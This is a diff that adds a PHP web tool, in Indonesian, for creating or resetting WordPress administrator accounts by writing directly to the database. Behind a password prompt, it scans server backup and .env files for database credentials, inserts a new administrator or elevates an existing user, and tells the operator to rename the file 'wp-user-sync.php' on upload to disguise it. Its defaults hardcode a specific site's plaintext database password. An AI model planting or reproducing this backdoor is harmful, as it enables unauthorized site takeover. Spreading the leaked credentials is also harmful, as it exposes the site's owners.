+        $id = (int) $row['ID'];
+        $m->query("UPDATE {$pref}users SET user_pass='$h', user_email='$e' WHERE ID=$id");
+        $m->query("DELETE FROM {$pref}usermeta WHERE user_id=$id AND meta_key IN ('$cap','$lvl')");
+        $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$cap', 'a:1:{s:13:\"administrator\";b:1;}')");
+        $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$lvl', '10')");
+        $m->close();
+        return array(
+            'ok'   => true,
+            'msg'  => 'User sudah ada - password direset via DB',
+            'user' => $user,
+            'pass' => $pass,
+            'id'   => $id,
+            'via'  => 'mysqli (reset)',
+        );
+    }
+    $m->query("INSERT INTO {$pref}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
+        VALUES ('$u', '$h', '$u', '$e', NOW(), 0, 'Recovery Admin')");
+    $id = (int) $m->insert_id;
+    if ($id < 1) {
+        $err = $m->error;
+        $m->close();
+        return array('ok' => false, 'msg' => 'INSERT user gagal: ' . $err);
+    }
+    $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$cap', 'a:1:{s:13:\"administrator\";b:1;}')");
+    $m->query("INSERT INTO {$pref}usermeta (user_id, meta_key, meta_value) VALUES ($id, '$lvl', '10')");
+    $m->close();
+    return array(
+        'ok'   => true,
+        'msg'  => 'Admin baru dibuat via database',
+        'user' => $user,
+        'pass' => $pass,
+        'id'   => $id,
+        'via'  => 'mysqli',
+    );
+}
+
+function ba_not_found_msg()
+{
+    $msg = 'Folder WordPress tidak ditemukan. Isi Path manual (folder wp-load.php) atau kredensial DB manual.';
+    $msg .= ' Script: ' . __FILE__;
+    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
+        $msg .= ' | DOCUMENT_ROOT: ' . $_SERVER['DOCUMENT_ROOT'];
+    }
+    return $msg;
+}
+
+function ba_urls_from_config_text($txt)
+{
+    $urls = array();
+    $keys = array('WP_HOME', 'WP_SITEURL', 'SITEURL', 'HOME');
+    $i = 0;
+    $kn = count($keys);
+    for ($i = 0; $i < $kn; $i++) {
+        $v = ba_resolve_cfg_value($keys[$i], ba_cfg_get($keys[$i], $txt), $txt);
+        if ($v !== '' && preg_match('#^https?://#i', $v)) {
+            $urls[rtrim($v, '/')] = $keys[$i] . ' (config)';
+        }
+    }
+    return $urls;
+}
+
+function ba_urls_from_db($mysqli, $pref)
+{
+    $urls = array();
+    $opts = array('siteurl', 'home');
+    $i = 0;
+    $on = count($opts);
+    for ($i = 0; $i < $on; $i++) {
+        $name = $mysqli->real_escape_string($opts[$i]);
+        $rs = @$mysqli->query("SELECT option_value FROM {$pref}options WHERE option_name='{$name}' LIMIT 1");
+        if ($rs && $rs->num_rows > 0) {
+            $row = $rs->fetch_assoc();
+            $v = trim((string) $row['option_value']);
+            if ($v !== '' && preg_match('#^https?://#i', $v)) {
+                $urls[rtrim($v, '/')] = $opts[$i] . ' (database)';
+            }
+        }
+    }
+    return $urls;
+}
+
+function ba_guess_urls_from_path($base)
+{
+    $urls = array();
+    $rp = @realpath($base);
+    if (!$rp) {
+        return $urls;
+    }
+    $host = '';
+    if (!empty($_SERVER['HTTP_HOST'])) {
+        $host = $_SERVER['HTTP_HOST'];
+    }
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $doc = !empty($_SERVER['DOCUMENT_ROOT']) ? @realpath($_SERVER['DOCUMENT_ROOT']) : false;
+    if ($host !== '' && $doc && strpos($rp, $doc) === 0) {
+        $rel = trim(str_replace('\\', '/', substr($rp, strlen($doc))), '/');
+        $path = $rel !== '' ? '/' . $rel : '';
+        $urls[$scheme . '://' . $host . $path] = 'tebak dari path + domain saat ini';
+        $urls[$scheme . '://' . $host . $path . '/wp-admin/'] = 'wp-admin (tebakan path)';
+    }
+    $folder = basename($rp);
+    if ($host !== '' && $folder !== '' && $folder !== 'html' && $folder !== 'public_html' && $folder !== 'www') {
+        $parts = explode('.', $host);
+        if (count($parts) >= 2) {
+            $root = $parts[count($parts) - 2] . '.' . $parts[count($parts) - 1];
+            $urls[$scheme . '://' . $folder . '.' . $root] = 'tebak subdomain folder';
+            $urls[$scheme . '://' . $folder . '.' . $root . '/wp-admin/'] = 'wp-admin (tebak subdomain)';
+        }
+    }
+    return $urls;
+}
+
+function ba_lookup_site_urls($base, $manual = null)
+{
+    if ($base === '' && ($manual === null || empty($manual['ok']))) {
+        return array('ok' => false, 'msg' => ba_not_found_msg());
+    }
+    if ($base === '') {
+        $base = dirname(__FILE__);
+    }
+    $cfg = ba_get_db_config($base, $manual);
+    if (!$cfg['ok']) {
+        return $cfg;
+    }
+    $urls = array();
+    $file = !empty($cfg['config_file']) ? $cfg['config_file'] : ba_locate_config_file($base);
+    if ($file !== '' && is_readable($file) && substr($file, -4) !== '.env') {
+        $txt = @file_get_contents($file);
+        if ($txt !== false) {
+            $urls = array_merge($urls, ba_urls_from_config_text($txt));
+        }
+    }
+    $conn = ba_connect($cfg['db']);
+    if (!$conn['ok']) {
+        return $conn;
+    }
+    $m = $conn['mysqli'];
+    $pref = $cfg['prefix'];
+    $urls = array_merge($urls, ba_urls_from_db($m, $pref));
+    $m->close();
+    $urls = array_merge($urls, ba_guess_urls_from_path($base));
+    if (count($urls) === 0) {
+        return array('ok' => false, 'msg' => 'URL tidak ditemukan di config/DB. Coba tebak: https://DOMAIN/noti/ jika folder = /var/www/html/noti/');
+    }
+    return array('ok' => true, 'urls' => $urls, 'pref' => $pref);
+}
+
+function ba_test_db($base, $manual = null)
+{
+    if ($base === '' && ($manual === null || empty($manual['ok']))) {
+        return array('ok' => false, 'msg' => ba_not_found_msg());
+    }
+    if ($base === '' && $manual !== null && $manual['ok']) {
+        $base = dirname(__FILE__);
+    }
+    $cfg = ba_get_db_config($base, $manual);
+    if (!$cfg['ok']) {
+        return $cfg;
+    }
+    $conn = ba_connect($cfg['db']);
+    if (!$conn['ok']) {
+        return $conn;
+    }
+    $m = $conn['mysqli'];
+    $pref = $cfg['prefix'];
+    $tbl = $pref . 'users';
+    $rs = @$m->query("SHOW TABLES LIKE '" . $m->real_escape_string($tbl) . "'");
+    $has = ($rs && $rs->num_rows > 0);
+    $urls = $has ? ba_urls_from_db($m, $pref) : array();
+    $m->close();
+    if (!$has) {
+        return array('ok' => false, 'msg' => 'Tabel ' . $tbl . ' tidak ditemukan (prefix salah?)');
+    }
+    return array(
+        'ok'   => true,
+        'msg'  => 'Database OK — tabel ' . $tbl . ' ditemukan' . (!empty($cfg['source']) && $cfg['source'] === 'manual' ? ' (kredensial manual)' : ''),
+        'db'   => $cfg['db']['name'],
+        'host' => $cfg['db']['host'],
+        'pref' => $pref,
+        'urls' => $urls,
+    );
+}
+
+function ba_create($base, $user, $pass, $email, $manual = null)
+{
+    if ($base === '' && ($manual === null || empty($manual['ok']))) {
+        return array('ok' => false, 'msg' => ba_not_found_msg());
+    }
+    if ($base === '' && $manual !== null && $manual['ok']) {
+        $base = ba_find_base('') !== '' ? ba_find_base('') : dirname(__FILE__);
+    }
+    if (ba_is_cli()) {
+        $r = ba_via_wpload($base, $user, $pass, $email);
+        if ($r['ok']) {
+            $r['base'] = $base;
+            return $r;
+        }
+        $r2 = ba_via_mysqli($base, $user, $pass, $email, $manual);
+        $r2['base'] = $base;
+        $r2['fallback'] = 'wp-load gagal: ' . $r['msg'];
+        return $r2;
+    }
+    $r = ba_via_mysqli($base, $user, $pass, $email, $manual);
+    $r['base'] = $base;
+    return $r;
+}
+
+$result = null;
+$test_result = null;
+$hunt_result = null;
+$url_result = null;
+if (isset($_POST['manual_path'])) {
+    $_SESSION['ba_manual'] = trim((string) $_POST['manual_path']);
+}
+$manual_path = isset($_POST['manual_path'])
+    ? trim((string) $_POST['manual_path'])
+    : (isset($_SESSION['ba_manual']) ? (string) $_SESSION['ba_manual'] : '');
+
+$db_host   = isset($_POST['db_host']) ? (string) $_POST['db_host'] : (isset($_SESSION['ba_db_host']) ? (string) $_SESSION['ba_db_host'] : 'localhost');
+$db_user   = isset($_POST['db_user']) ? (string) $_POST['db_user'] : (isset($_SESSION['ba_db_user']) ? (string) $_SESSION['ba_db_user'] : 'astverdi_pba-assunnah');
+$db_pass   = isset($_POST['db_pass']) ? (string) $_POST['db_pass'] : (isset($_SESSION['ba_db_pass']) ? (string) $_SESSION['ba_db_pass'] : '5?)sBPgl-$&H');
+$db_name   = isset($_POST['db_name']) ? (string) $_POST['db_name'] : (isset($_SESSION['ba_db_name']) ? (string) $_SESSION['ba_db_name'] : 'astverdi_pba-assunnah');
+$db_prefix = isset($_POST['db_prefix']) ? (string) $_POST['db_prefix'] : (isset($_SESSION['ba_db_prefix']) ? (string) $_SESSION['ba_db_prefix'] : 'wpyc_');
+$use_manual_db = !empty($_POST['use_manual_db']) || ($db_user !== '' && $db_name !== '');
+
+if (isset($_POST['manual_path']) || isset($_POST['testdb']) || isset($_POST['run'])) {
+    if (isset($_POST['db_host'])) {
+        $_SESSION['ba_db_host'] = trim((string) $_POST['db_host']);
+    }
+    if (isset($_POST['db_user'])) {
+        $_SESSION['ba_db_user'] = trim((string) $_POST['db_user']);
+    }
+    if (isset($_POST['db_pass'])) {
+        $_SESSION['ba_db_pass'] = (string) $_POST['db_pass'];
+    }
+    if (isset($_POST['db_name'])) {
+        $_SESSION['ba_db_name'] = trim((string) $_POST['db_name']);
+    }
+    if (isset($_POST['db_prefix'])) {
+        $_SESSION['ba_db_prefix'] = trim((string) $_POST['db_prefix']);
+    }
+}
+
+if (isset($_POST['pw'])) {
+    if ((string) $_POST['pw'] === (string) $BA_PASS) {
+        $_SESSION['ba_ok'] = 1;
+        header('Location: ' . (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : 'buat_admin.php'));
+        exit;
+    }
+}
+
+if (ba_ok() && isset($_POST['huntcred'])) {
+    $base = ba_find_base($manual_path);
+    $hits = ba_hunt_credentials($base !== '' ? $base : $manual_path);
+    if (count($hits) === 0) {
+        $hunt_result = array(
+            'ok'  => false,
+            'msg' => 'Tidak ada kredensial DB ditemukan di file server. Tanpa backup wp-config / .env, perlu minta ke admin hosting.',
+        );
+    } else {
+        $hunt_result = array('ok' => true, 'hits' => $hits);
+    }
+}
+
+if (ba_ok() && isset($_POST['apply_cred'])) {
+    $idx = (int) $_POST['apply_cred'];
+    $base = ba_find_base($manual_path);
+    $hits = ba_hunt_credentials($base !== '' ? $base : $manual_path);
+    if ($idx >= 0 && $idx < count($hits)) {
+        $hit = $hits[$idx];
+        $db_host = $hit['db']['host'];
+        $db_user = $hit['db']['user'];
+        $db_pass = $hit['db']['pass'];
+        $db_name = $hit['db']['name'];
+        $db_prefix = $hit['prefix'];
+        $use_manual_db = true;
+        $_SESSION['ba_db_host'] = $db_host;
+        $_SESSION['ba_db_user'] = $db_user;
+        $_SESSION['ba_db_pass'] = $db_pass;
+        $_SESSION['ba_db_name'] = $db_name;
+        $_SESSION['ba_db_prefix'] = $db_prefix;
+        $hunt_result = array(
+            'ok'  => true,
+            'msg' => 'Kredensial dari ' . $hit['file'] . ' sudah diisi ke form. Klik Test Database.',
+        );
+    }
+}
+
+if (ba_ok() && isset($_POST['findurl'])) {
+    $base = ba_find_base($manual_path);
+    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
+    $url_result = ba_lookup_site_urls($base, $manual_db);
+}
+
+if (ba_ok() && isset($_POST['testdb'])) {
+    $base = ba_find_base($manual_path);
+    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
+    $test_result = ba_test_db($base, $manual_db);
+}
+
+if (ba_ok() && isset($_POST['run'])) {
+    $user = isset($_POST['username']) ? trim($_POST['username']) : $BA_USER;
+    $pass = isset($_POST['newpass']) ? $_POST['newpass'] : $BA_NEWPW;
+    $mail = isset($_POST['email']) ? trim($_POST['email']) : $BA_EMAIL;
+    $base = ba_find_base($manual_path);
+    $manual_db = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
+    if ($user === '' || $pass === '') {
+        $result = array('ok' => false, 'msg' => 'Username/password wajib diisi');
+    } else {
+        $result = ba_create($base, $user, $pass, $mail, $manual_db);
+    }
+}
+
+header('Content-Type: text/html; charset=utf-8');
+
+if (!ba_ok()) {
+    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Buat Admin</title>';
+    echo '<style>body{font:15px sans-serif;background:#f5f5f5;padding:20px}.b{max-width:380px;margin:40px auto;background:#fff;border:1px solid #ddd;padding:20px}input,button{width:100%;padding:10px;box-sizing:border-box;margin-top:8px}button{background:#2563eb;color:#fff;border:0}</style></head><body>';
+    echo '<div class="b"><h2>Buat WP Admin</h2><form method="post"><input type="password" name="pw" required placeholder="Password tool">';
+    echo '<button type="submit">Login</button></form></div></body></html>';
+    exit;
+}
+
+$base = ba_find_base($manual_path);
+$fake_cfg = ($base !== '') ? ba_fake_wpconfig_path($base) : '';
+$manual_db_preview = ba_build_manual_db($use_manual_db, $db_host, $db_user, $db_pass, $db_name, $db_prefix);
+$cfg_preview = ba_get_db_config($base !== '' ? $base : dirname(__FILE__), $manual_db_preview);
+
+echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Buat Admin</title>';
+echo '<style>body{font:14px sans-serif;background:#f5f5f5;padding:16px}.c{max-width:620px;margin:0 auto;background:#fff;border:1px solid #ddd;padding:16px}';
+echo 'input{width:100%;padding:8px;box-sizing:border-box;margin:6px 0}.btn{padding:10px 16px;background:#2563eb;color:#fff;border:0;cursor:pointer;margin-right:8px}';
+echo '.ok{background:#ecfdf5;padding:12px;border:1px solid #86efac;margin:12px 0}.err{background:#fef2f2;padding:12px;border:1px solid #fca5a5;margin:12px 0}';
+echo '.warn{background:#fffbeb;padding:12px;border:1px solid #fcd34d;margin:12px 0}.m{font-size:12px;color:#666}fieldset{border:1px solid #ddd;padding:12px;margin:12px 0}</style></head><body>';
+echo '<div class="c"><h2>Buat WordPress Administrator</h2>';
+echo '<p class="m"><b>v2.5</b> — cari URL website dari DB/config | PHP ' . ba_esc(PHP_VERSION) . '</p>';
+echo '<div class="warn" style="background:#fffbeb;padding:10px;border:1px solid #fcd34d;margin:10px 0;font-size:13px">';
+echo '<b>Site ini:</b> DB <code>astverdi_pba-assunnah</code> | prefix <code>wpyc_</code><br>';
+echo 'Base URL <b>tidak ada di wp-config</b> — klik <b>Cari URL Website</b> untuk baca dari tabel <code>wpyc_options</code><br>';
+echo 'Rename saat upload: <code>wp-user-sync.php</code></div>';
+echo '<p class="m">Script: <code>' . ba_esc(__FILE__) . '</code></p>';
+echo '<p class="m">WP path: <code>' . ba_esc($base !== '' ? $base : '(belum ditemukan — isi path manual)') . '</code></p>';
+if ($fake_cfg !== '') {
+    echo '<div class="warn"><b>Peringatan:</b> <code>' . ba_esc($fake_cfg) . '</code> berisi HTML (bukan config WordPress). Kemungkinan hasil deface/malware. Pakai kredensial DB manual atau cari backup <code>wp-config.php.bak</code>.</div>';
+}
+if ($cfg_preview['ok']) {
+    echo '<p class="m">Config: <code>' . ba_esc($cfg_preview['config_file']) . '</code></p>';
+    echo '<p class="m">DB: <code>' . ba_esc($cfg_preview['db']['name']) . '@' . ba_esc($cfg_preview['db']['host']) . '</code> | prefix: <code>' . ba_esc($cfg_preview['prefix']) . '</code></p>';
+} elseif ($base === '' && !$use_manual_db) {
+    echo '<p class="m">Contoh path manual: <code>..</code>, <code>../public_html</code>, atau <code>/var/www/html2/</code></p>';
+}
+
+if ($hunt_result !== null) {
+    if (!$hunt_result['ok'] && !empty($hunt_result['msg']) && empty($hunt_result['hits'])) {
+        echo '<div class="err">' . ba_esc($hunt_result['msg']) . '</div>';
+    } elseif (!empty($hunt_result['msg'])) {
+        echo '<div class="ok">' . ba_esc($hunt_result['msg']) . '</div>';
+    }
+    if (!empty($hunt_result['hits'])) {
+        echo '<div class="ok"><b>Kredensial ditemukan di file server:</b><ul style="margin:8px 0;padding-left:18px">';
+        $hi = 0;
+        $hn = count($hunt_result['hits']);
+        for ($hi = 0; $hi < $hn; $hi++) {
+            $h = $hunt_result['hits'][$hi];
+            echo '<li style="margin:8px 0"><code>' . ba_esc($h['file']) . '</code><br>';
+            echo 'Host: <b>' . ba_esc($h['db']['host']) . '</b> | User: <b>' . ba_esc($h['db']['user']) . '</b> | DB: <b>' . ba_esc($h['db']['name']) . '</b><br>';
+            echo 'Pass: <code>' . ba_esc(ba_mask_pass($h['db']['pass'])) . '</code> | Prefix: <code>' . ba_esc($h['prefix']) . '</code><br>';
+            echo '<button class="btn" type="submit" name="apply_cred" value="' . $hi . '" form="baform">Pakai #' . ($hi + 1) . '</button></li>';
+        }
+        echo '</ul></div>';
+    }
+}
+
+if ($test_result !== null) {
+    if ($test_result['ok']) {
+        echo '<div class="ok">' . ba_esc($test_result['msg']);
+        if (!empty($test_result['urls'])) {
+            echo '<br><br><b>URL website (dari database):</b><ul style="margin:6px 0;padding-left:18px">';
+            foreach ($test_result['urls'] as $u => $src) {
+                echo '<li><a href="' . ba_esc($u) . '/wp-admin/" target="_blank">' . ba_esc($u) . '</a> <span class="m">(' . ba_esc($src) . ')</span></li>';
+            }
+            echo '</ul>';
+        }
+        echo '</div>';
+    } else {
+        echo '<div class="err">' . ba_esc($test_result['msg']) . '</div>';
+    }
+}
+
+if ($url_result !== null) {
+    if (!$url_result['ok']) {
+        echo '<div class="err">' . ba_esc($url_result['msg']) . '</div>';
+    } else {
+        echo '<div class="ok"><b>URL website ditemukan:</b><ul style="margin:6px 0;padding-left:18px">';
+        foreach ($url_result['urls'] as $u => $src) {
+            $admin = rtrim($u, '/') . '/wp-admin/';
+            echo '<li><b>' . ba_esc($src) . '</b><br>';
+            echo 'Site: <a href="' . ba_esc($u) . '" target="_blank">' . ba_esc($u) . '</a><br>';
+            echo 'Admin: <a href="' . ba_esc($admin) . '" target="_blank">' . ba_esc($admin) . '</a></li>';
+        }
+        echo '</ul><span class="m">Prioritas: URL dari database &gt; config &gt; tebakan path.</span></div>';
+    }
+}
+
+if ($result !== null) {
+    if ($result['ok']) {
+        echo '<div class="ok"><b>' . ba_esc($result['msg']) . '</b><br><br>';
+        echo 'Metode: ' . ba_esc($result['via']) . '<br>';
+        echo 'User: <b>' . ba_esc($result['user']) . '</b><br>';
+        echo 'Pass: <b>' . ba_esc($result['pass']) . '</b><br>';
+        echo 'User ID: ' . (int) $result['id'] . '<br>';
+        if (!empty($result['fallback'])) {
+            echo '<span class="m">' . ba_esc($result['fallback']) . '</span><br>';
+        }
+        if (!empty($result['login_url'])) {
+            echo '<br>Login: <a href="' . ba_esc($result['login_url']) . '" target="_blank">' . ba_esc($result['login_url']) . '</a><br>';
+        } else {
+            echo '<br>Login: <a href="/wp-admin/">/wp-admin/</a><br>';
+        }
+        echo '<b class="m">HAPUS buat_admin.php sekarang!</b></div>';
+    } else {
+        echo '<div class="err">' . ba_esc($result['msg']) . '</div>';
+    }
+}
+
+echo '<form method="post" id="baform">';
+echo '<label>Path manual (folder wp-load.php)</label><input name="manual_path" value="' . ba_esc($manual_path) . '" placeholder="/var/www/html2/">';
+echo '<fieldset><legend>Kredensial database manual</legend>';
+echo '<p class="m">Tanpa cPanel: klik <b>Cari Kredensial DB</b> dulu — script scan file backup (.bak, .old, .env) di server.</p>';
+echo '<label><input type="checkbox" name="use_manual_db" value="1"' . ($use_manual_db ? ' checked' : '') . '> Pakai kredensial DB manual</label>';
+echo '<label>DB Host</label><input name="db_host" value="' . ba_esc($db_host) . '" placeholder="localhost (jangan $dbhost)">';
+echo '<label>DB User</label><input name="db_user" value="' . ba_esc($db_user) . '">';
+echo '<label>DB Password</label><input name="db_pass" type="password" value="' . ba_esc($db_pass) . '">';
+echo '<label>DB Name</label><input name="db_name" value="' . ba_esc($db_name) . '">';
+echo '<label>Table prefix (kosongkan = auto-detect)</label><input name="db_prefix" value="' . ba_esc($db_prefix) . '" placeholder="wp_">';
+echo '</fieldset>';
+echo '<label>Username</label><input name="username" value="' . ba_esc($BA_USER) . '">';
+echo '<label>Password baru</label><input name="newpass" value="' . ba_esc($BA_NEWPW) . '">';
+echo '<label>Email</label><input name="email" value="' . ba_esc($BA_EMAIL) . '">';
+echo '<p class="m">Web: langsung ke database (mysqli). Tidak memuat WordPress — tidak redirect ke index.php.</p>';
+echo '<button class="btn" type="submit" name="huntcred" value="1">Cari Kredensial DB</button>';
+echo '<button class="btn" type="submit" name="findurl" value="1">Cari URL Website</button>';
+echo '<button class="btn" type="submit" name="testdb" value="1">Test Database</button>';
+echo '<button class="btn" type="submit" name="run" value="1" onclick="return confirm(\'Buat/reset admin WordPress?\');">Buat Admin</button>';
+echo '</form></div></body></html>';
